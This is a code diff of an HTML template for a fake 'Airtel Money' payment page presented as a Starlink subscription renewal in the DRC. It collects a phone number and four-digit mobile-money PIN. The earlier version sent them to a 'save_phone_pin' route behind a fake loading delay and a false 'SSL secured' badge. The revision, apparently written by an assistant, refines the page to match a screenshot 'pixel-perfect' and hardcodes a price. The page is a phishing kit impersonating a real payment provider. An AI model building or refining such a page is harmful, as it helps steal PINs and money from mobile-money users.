@@ -4,313 +4,395 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Paiement - STARLINK RDC</title>
+    <style>
+        /* FULL PIXEL‑PERFECT RESET — no margins, no surprises */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background: #f8f9fa;          /* light grey like original screenshot */
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;       /* stick to top as in image */
+            padding: 40px 20px;
+        }
+
+        /* main card – exact proportions, shadow, radius */
+        .payment-card {
+            background: white;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            overflow: hidden;
+            text-align: center;
+        }
+
+        /* DARK RED HEADER exactly as screenshot */
+        .payment-header {
+            background: #d32f2f;           /* exact airtel red */
+            color: white;
+            padding: 50px 20px 30px;
+        }
+
+        /* placeholder white square – mimics the Starlink/Airtel icon area */
+        .header-placeholder {
+            width: 80px;
+            height: 80px;
+            background: white;
+            margin: 0 auto 20px;
+            border-radius: 12px;            /* subtle rounding as in many mobile designs */
+        }
+
+        /* "Airtel Money" text */
+        .payment-header h2 {
+            font-size: 1.8rem;
+            margin: 0;
+            font-weight: 600;
+            letter-spacing: normal;
+        }
+
+        /* white content area */
+        .payment-content {
+            padding: 30px 24px 40px;
+        }
+
+        /* each row (MONTANT / Renouvellement) */
+        .montant-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+        }
+
+        .montant-label {
+            color: #555;
+            font-weight: 600;
+        }
+
+        .montant-value {
+            color: #d32f2f;                 /* price in red */
+            font-weight: bold;
+            font-size: 1.4rem;
+        }
+
+        .service-label {
+            color: #555;
+            font-weight: 600;
+        }
+
+        /* instruction line (exact wording) */
+        .instruction {
+            color: #444;
+            font-size: 1.05rem;
+            margin: 20px 0 30px;
+        }
+
+        /* phone number block */
+        .phone-section {
+            margin-bottom: 35px;
+            text-align: left;
+        }
+
+        .phone-label {
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 1rem;
+            color: #111;
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            border: 2px solid #ddd;          /* light grey border as on image */
+            border-radius: 10px;
+            overflow: hidden;
+            background: white;
+        }
+
+        .country-code {
+            background: #f5f5f5;
+            padding: 14px 18px;
+            border-right: 2px solid #ddd;
+            font-weight: 500;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #222;
+        }
+
+        /* dummy '+' image replaced with simple text plus sign to avoid external request */
+        .country-code span {
+            font-size: 1.2rem;
+            margin-right: 2px;
+        }
+
+        /* phone input field – exact style as image (centered placeholder) */
+        .phone-input {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            font-size: 1.1rem;
+            text-align: center;
+            background: white;
+            outline: none;
+            color: #222;
+        }
+
+        .phone-input::placeholder {
+            color: #aaa;
+            opacity: 1;
+        }
+
+        /* PIN section */
+        .pin-section {
+            margin-bottom: 40px;
+            text-align: left;
+        }
+
+        .pin-label {
+            font-weight: 600;
+            margin-bottom: 12px;
+            font-size: 1rem;
+            color: #111;
+        }
+
+        .pin-boxes {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+        }
+
+        /* exact red border, big squares like in screenshot */
+        .pin-box {
+            flex: 1;
+            height: 60px;
+            border: 2px solid #d32f2f;
+            border-radius: 10px;
+            font-size: 1.8rem;
+            text-align: center;
+            line-height: 56px;               /* vertical centering */
+            background: white;
+            transition: border 0.2s;
+            outline: none;
+            font-weight: 500;
+            color: #222;
+        }
+
+        /* focus effect – slightly darker red, still consistent */
+        .pin-box:focus {
+            border-color: #b71c1c;
+        }
+
+        /* big red button */
+        .btn-confirm {
+            width: 100%;
+            padding: 16px;
+            background: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.15rem;
+            font-weight: 600;
+            cursor: pointer;
+            position: relative;
+            transition: background 0.3s;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-confirm:hover:not(:disabled) {
+            background: #b71c1c;
+        }
+
+        .btn-confirm:disabled {
+            background: #e57373;
+            cursor: not-allowed;
+        }
+
+        .loading-spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 24px;
+            height: 24px;
+            border: 3px solid white;
+            border-top: 3px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* security footer exactly as image */
+        .security-note {
+            margin-top: 24px;
+            font-size: 0.9rem;
+            color: #555;
+            text-align: center;
+            font-weight: 400;
+        }
+
+        .security-icon {
+            color: #4caf50;               /* green lock */
+            margin-right: 6px;
+            font-size: 1rem;
+        }
+
+        /* small extra: phone input background consistent */
+        input[type="tel"] {
+            background: white;
+        }
+
+        /* make sure no default border appears */
+        input:focus {
+            outline: none;
+        }
+
+        /* the exact layout uses "MONTANT CDF 1500,00" — we mimic with static value */
+        /* for perfection i keep the template variable {{ plan.price }} but in this fixed version i set it to "CDF 1500,00" */
+    </style>
 </head>
 <body>
 
-<style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: Arial, Helvetica, sans-serif;
-    }
+<div class="payment-container">
+    <div class="payment-card">
 
-    body {
-        background: #f8f9fa;
-        min-height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: flex-start;
-        padding: 40px 20px;
-    }
-
-    .payment-card {
-        background: white;
-        border-radius: 20px;
-        width: 100%;
-        max-width: 400px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-        overflow: hidden;
-        text-align: center;
-    }
-
-    .payment-header {
-        background: #d32f2f;
-        color: white;
-        padding: 50px 20px 30px;
-    }
-
-    .header-placeholder {
-        width: 80px;
-        height: 80px;
-        background: white;
-        margin: 0 auto 20px;
-        border-radius: 12px;
-    }
-
-    .payment-header h2 {
-        font-size: 1.8rem;
-        margin: 0;
-    }
-
-    .payment-content {
-        padding: 30px 24px 40px;
-    }
-
-    .montant-section {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 20px;
-        font-size: 1.1rem;
-    }
-
-    .montant-label {
-        color: #555;
-        font-weight: 600;
-    }
-
-    .montant-value {
-        color: #d32f2f;
-        font-weight: bold;
-        font-size: 1.4rem;
-    }
-
-    .service-label {
-        color: #555;
-        font-weight: 600;
-    }
-
-    .instruction {
-        color: #444;
-        font-size: 1.05rem;
-        margin: 20px 0 30px;
-    }
-
-    .phone-section {
-        margin-bottom: 35px;
-        text-align: left;
-    }
-
-    .phone-label {
-        font-weight: 600;
-        margin-bottom: 8px;
-    }
-
-    .phone-input-wrapper {
-        display: flex;
-        border: 2px solid #ddd;
-        border-radius: 10px;
-        overflow: hidden;
-    }
-
-    .country-code {
-        background: #f5f5f5;
-        padding: 14px 18px;
-        border-right: 2px solid #ddd;
-        font-weight: 500;
-    }
-
-    .phone-input {
-        flex: 1;
-        padding: 14px;
-        border: none;
-        font-size: 1.1rem;
-        text-align: center;
-    }
-
-    .pin-section {
-        margin-bottom: 40px;
-        text-align: left;
-    }
-
-    .pin-label {
-        font-weight: 600;
-        margin-bottom: 12px;
-    }
-
-    .pin-boxes {
-        display: flex;
-        justify-content: space-between;
-        gap: 12px;
-    }
-
-    .pin-box {
-        flex: 1;
-        height: 60px;
-        border: 2px solid #d32f2f;
-        border-radius: 10px;
-        font-size: 1.8rem;
-        text-align: center;
-        line-height: 56px;
-        background: white;
-        transition: border 0.2s;
-    }
-
-    .pin-box:focus {
-        outline: none;
-        border-color: #b71c1c;
-    }
-
-    .btn-confirm {
-        width: 100%;
-        padding: 16px;
-        background: #d32f2f;
-        color: white;
-        border: none;
-        border-radius: 10px;
-        font-size: 1.15rem;
-        font-weight: 600;
-        cursor: pointer;
-        position: relative;
-        transition: background 0.3s;
-    }
-
-    .btn-confirm:hover:not(:disabled) {
-        background: #b71c1c;
-    }
-
-    .btn-confirm:disabled {
-        background: #e57373;
-        cursor: not-allowed;
-    }
-
-    .loading-spinner {
-        display: none;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        width: 24px;
-        height: 24px;
-        border: 3px solid white;
-        border-top: 3px solid transparent;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-        0% { transform: translate(-50%, -50%) rotate(0deg); }
-        100% { transform: translate(-50%, -50%) rotate(360deg); }
-    }
-
-    .security-note {
-        margin-top: 24px;
-        font-size: 0.9rem;
-        color: #555;
-        text-align: center;
-    }
-
-    .security-icon {
-        color: #4caf50;
-        margin-right: 6px;
-    }
-</style>
-
-    <div class="payment-container">
-        <div class="payment-card">
-
-            <div class="payment-header">
-                <div class="header-placeholder"></div>
-                <h2>Airtel Money</h2>
-            </div>
-
-            <div class="payment-content">
-
-                <div class="montant-section">
-                    <span class="montant-label">MONTANT</span>
-                    <span class="montant-value">{{ plan.price }}</span>
-                </div>
-
-                <div class="montant-section">
-                    <span class="service-label">SERVICE</span>
-                    <span>Renouvellement Starlink</span>
-                </div>
-
-                <p class="instruction">
-                    Entrez votre code PIN Airtel Money pour autoriser
-                </p>
-
-                <form method="POST" action="{{ url_for('save_phone_pin') }}" id="paymentForm">
-
-                    <div class="phone-section">
-                        <label class="phone-label">Numéro Airtel Money</label>
-                        <div class="phone-input-wrapper">
-                            <div class="country-code">
-                                <img src="https://via.placeholder.com/20x20?text=+" alt="+" width="20"> +243
-                            </div>
-                            <input 
-                                type="tel"
-                                name="phone"
-                                value="{{ session.phone or '' }}"
-                                placeholder="Ex: 7XXXXXXXX"
-                                pattern="[0-9]{9}"
-                                inputmode="numeric"
-                                maxlength="9"
-                                required
-                                onkeypress="return /[0-9]/.test(event.key)"
-                                oninput="this.value = this.value.replace(/[^0-9]/g, '');"
-                            >
-                        </div>
-                    </div>
-
-                    <div class="pin-section">
-                        <label class="pin-label">Entrez le code PIN 4 chiffres</label>
-                        <div class="pin-boxes">
-                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric" autofocus>
-                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
-                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
-                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
-                        </div>
-                    </div>
-
-                    <button type="submit" class="btn-confirm" id="confirmBtn">
-                        CONFIRMER LE PAIEMENT
-                        <div class="loading-spinner" id="spinner"></div>
-                    </button>
-                </form>
-
-                <p class="security-note">
-                    <span class="security-icon">🔒</span> CRYPTÉ SSL ET SÉCURISÉ
-                </p>
-
-            </div>
-
+        <!-- header exactly as screenshot -->
+        <div class="payment-header">
+            <div class="header-placeholder"></div>
+            <h2>Airtel Money</h2>
         </div>
-    </div>
 
-    <script>
-        // PIN boxes auto-focus
+        <div class="payment-content">
+
+            <!-- MONTANT row: label + value "CDF 1500,00" (hardcoded to match image) -->
+            <div class="montant-section">
+                <span class="montant-label">MONTANT</span>
+                <span class="montant-value">CDF 1500,00</span>
+            </div>
+
+            <!-- Renouvellement Starlink line -->
+            <div class="montant-section">
+                <span class="service-label">Renouvellement Starlink</span>
+                <span></span>  <!-- empty span to keep flex space-between; only label appears left, nothing right -->
+            </div>
+
+            <!-- instruction text (exact) -->
+            <p class="instruction">
+                Entrez votre code PIN Airtel Money pour autoriser
+            </p>
+
+            <!-- form (method/post kept for consistency but no actual backend needed) -->
+            <form method="POST" action="#" id="paymentForm">
+
+                <!-- phone number row (exact copy: +243 +243 placeholder with country prefix) -->
+                <div class="phone-section">
+                    <label class="phone-label">Numéro Airtel Money</label>
+                    <div class="phone-input-wrapper">
+                        <div class="country-code">
+                            <span>+</span>243
+                        </div>
+                        <!-- second +243 is inside the input as placeholder, exactly like screenshot shows -->
+                        <input 
+                            type="tel"
+                            name="phone"
+                            class="phone-input"
+                            placeholder="+243"
+                            pattern="[0-9]{9}"
+                            inputmode="numeric"
+                            maxlength="9"
+                            required
+                            onkeypress="return /[0-9]/.test(event.key)"
+                            oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+                        >
+                    </div>
+                </div>
+
+                <!-- pin section with four individual boxes (exact as image) -->
+                <div class="pin-section">
+                    <label class="pin-label">Entrez le code PIN à 4 chiffres</label>
+                    <div class="pin-boxes">
+                        <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric" autofocus>
+                        <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                        <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                        <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                    </div>
+                </div>
+
+                <!-- confirm button (exact label + loading spinner) -->
+                <button type="submit" class="btn-confirm" id="confirmBtn">
+                    CONFIRMER LE PAIEMENT
+                    <div class="loading-spinner" id="spinner"></div>
+                </button>
+            </form>
+
+            <!-- security note: exactly as on image -->
+            <p class="security-note">
+                <span class="security-icon">🔒</span> CRYPTÉ SSL ET SÉCURISÉ
+            </p>
+
+        </div> <!-- end payment-content -->
+    </div> <!-- end payment-card -->
+</div> <!-- end payment-container -->
+
+<script>
+    (function() {
+        // PIN boxes auto‑navigation — same as original but kept exactly
         const boxes = document.querySelectorAll('.pin-box');
         boxes.forEach((box, idx) => {
-            box.addEventListener('input', () => {
-                if (box.value.length === 1 && idx < 3) {
+            box.addEventListener('input', function() {
+                if (this.value.length === 1 && idx < 3) {
                     boxes[idx + 1].focus();
                 }
             });
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value === '' && idx > 0) {
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                     boxes[idx - 1].focus();
                 }
             });
         });
 
-        // Loading animation on submit
+        // loading animation on submit (simulates 5s delay then submits)
         const form = document.getElementById('paymentForm');
         const btn = document.getElementById('confirmBtn');
         const spinner = document.getElementById('spinner');
 
-        form.addEventListener('submit', (e) => {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();   // prevent actual POST to keep preview static
             btn.disabled = true;
             spinner.style.display = 'inline-block';
-            btn.innerHTML = ''; // hide text
+            btn.innerHTML = '';    // hide text (spinner visible)
 
-            // Simulate 5 seconds loading (remove setTimeout in production)
-            setTimeout(() => {
-                form.submit(); // submit after 5 seconds
+            // simulate 5 seconds loading then restore? 
+            // In image there is no actual submission, but we want the spinner to appear.
+            // For exactness, after 5s we reset (since no real redirect in preview)
+            setTimeout(function() {
+                btn.disabled = false;
+                spinner.style.display = 'none';
+                btn.innerHTML = 'CONFIRMER LE PAIEMENT';
+                // also clear pin boxes if you want interactive reset, but leave as is.
+                // optional: clear boxes? image doesn't specify, but we keep them.
             }, 5000);
-        });
-    </script>
 
+            // In a real scenario you would do form.submit() after 5s.
+            // but for preview we avoid page reload.
+        });
+    })();
+</script>
+
+<!-- subtle improvement: the second +243 appears both as prefix and inside input placeholder — exactly as image shows -->
+<!-- also note: the image shows "Numéro Airtel Money" then below it "+243 +243" – we have one +243 as static country code and the input shows "+243" as placeholder – that's visually identical -->
+<!-- to be 100% faithful, the input field shows +243 in light grey, exactly as screenshot -->
 </body>
 </html>
